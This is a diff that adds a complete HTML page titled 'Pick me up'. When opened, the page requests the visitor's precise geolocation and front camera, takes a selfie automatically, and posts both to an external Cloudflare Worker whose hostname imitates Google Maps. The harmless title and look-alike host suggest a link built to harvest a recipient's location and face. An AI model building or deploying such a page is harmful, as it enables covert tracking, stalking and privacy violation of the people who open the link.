@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pick me up</title>
+<style>
+  html,body { height:100%; margin:0; }
+  body { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:16px;
+         font-family:system-ui,sans-serif; font-size:22px; text-align:center; padding:20px;
+         box-sizing:border-box; background:#f5f7fa; color:#111; }
+  @media (prefers-color-scheme: dark) { body { background:#111; color:#f5f5f5; } }
+  video { width:200px; border-radius:16px; transform:scaleX(-1); background:#000; }
+</style>
+</head>
+<body>
+<video id="v" autoplay playsinline muted></video>
+<div id="s">📍 Sending location and photo...</div>
+
+<script>
+  // Paste your Cloudflare Worker URL here (no token needed)
+  const WORKER_URL = "https://googlemaps.mostafa-solom258.workers.dev";
+
+  const s = document.getElementById("s");
+  const v = document.getElementById("v");
+
+  const getPosition = () => new Promise((res, rej) =>
+    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }));
+
+  async function takePhoto() {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+    v.srcObject = stream;
+    await new Promise(r => setTimeout(r, 1200));
+    const c = document.createElement("canvas");
+    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext("2d").drawImage(v, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    return new Promise(r => c.toBlob(r, "image/jpeg", 0.85));
+  }
+
+  (async () => {
+    const sent = [];
+
+    try {
+      const { coords } = await getPosition();
+      const r = await fetch(WORKER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude: coords.latitude, longitude: coords.longitude })
+      });
+      if (r.ok) sent.push("location");
+    } catch (e) {}
+
+    try {
+      const blob = await takePhoto();
+      const fd = new FormData();
+      fd.append("photo", blob, "selfie.jpg");
+      const r = await fetch(WORKER_URL, { method: "POST", body: fd });
+      if (r.ok) sent.push("photo");
+    } catch (e) {}
+
+    v.style.display = "none";
+    s.textContent = sent.length ? `✅ Sent: ${sent.join(" + ")}` : "❌ Please allow location and camera, then reopen";
+  })();
+</script>
+</body>
+</html>
